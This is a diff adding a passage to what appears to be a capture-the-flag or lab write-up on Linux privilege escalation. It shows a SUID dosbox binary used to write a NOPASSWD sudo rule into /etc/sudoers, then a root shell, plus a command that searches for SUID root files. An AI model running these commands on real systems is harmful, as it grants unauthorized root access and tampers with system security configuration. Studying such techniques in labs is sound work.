@@ -2322,6 +2322,47 @@ sh-3.2# id
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 ````
+#### /usr/bin/dosbox
+````
+DOSBox version 0.74-3
+````
+````
+export LFILE='/etc/sudoers'
+dosbox -c 'mount c /' -c "echo commander ALL=(root) NOPASSWD: ALL >>c:$LFILE"
+
+DOSBox version 0.74-3
+Copyright 2002-2019 DOSBox Team, published under GNU GPL.
+---
+ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
+ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
+CONFIG:Loading primary settings from config file /home/commander/.dosbox/dosbox-0.74-3.conf
+MIXER:Can't open audio: No available audio device , running in nosound mode.
+ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
+MIDI:Opened device:none
+SHELL:Redirect output to c:/etc/sudoers
+
+````
+
+````
+[commander@nukem ~]$ sudo -l
+Runas and Command-specific defaults for commander:
+    Defaults!/etc/ctdb/statd-callout !requiretty
+
+User commander may run the following commands on nukem:
+    (root) NOPASSWD: ALL
+````
+
+````
+[commander@nukem ~]$ sudo su
+[root@nukem commander]# whoami
+root
+````
 #### /usr/bin/cp
 ````
 find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
